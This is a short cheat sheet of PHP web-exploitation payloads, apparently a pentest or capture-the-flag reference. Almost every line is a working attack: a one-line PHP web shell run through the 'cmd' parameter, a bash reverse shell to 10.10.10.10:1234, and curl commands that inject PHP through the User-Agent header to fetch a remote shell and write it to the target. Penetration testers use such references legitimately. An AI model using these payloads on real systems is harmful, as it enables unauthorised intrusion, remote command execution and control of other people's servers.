# PHP Commands
Commands and payloads for PHP-based web exploitation

## Mini PHP Shell
```php copy
<?php system($_REQUEST['cmd']) ?>
```
- Executes system commands passed via the `cmd` parameter.

```bash copy
curl http://10.10.10.10/shell.php?cmd=ls
```
- Sends a request to the PHP shell to list directory contents.

## PHP Reverse Shell
```php copy
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.10.10/1234 0>&1'"); ?>
```
- Executes a reverse bash shell connecting to the attacker.

## Upload PHP Shell (Variant 1)
```bash copy
curl -A "<?php file_put_contents('shell.php',file_get_contents('http://10.10.10.10:80/shell.php'))?>" -s http://10.10.10.10
```
- Uploads a PHP shell by writing it to `shell.php` on the target.
- `-A`: Sets the user agent to the PHP payload.
- `-s`: Silent mode, suppresses output.

## Upload PHP Shell (Variant 2)
```bash copy
curl -A "<?php file_put_contents('shell.php',file_get_contents('http://10.10.10.10:80/shell.php')); ?>" -s http://10.10.10.10
```
- Alternative syntax to upload a PHP shell to `shell.php`.
- `-A`: Sets the user agent to the PHP payload.
- `-s`: Silent mode, suppresses output.

## Access PHP Shell
```bash copy
curl http://10.10.10.10/shell.php
```
- Accesses the uploaded PHP shell on the target.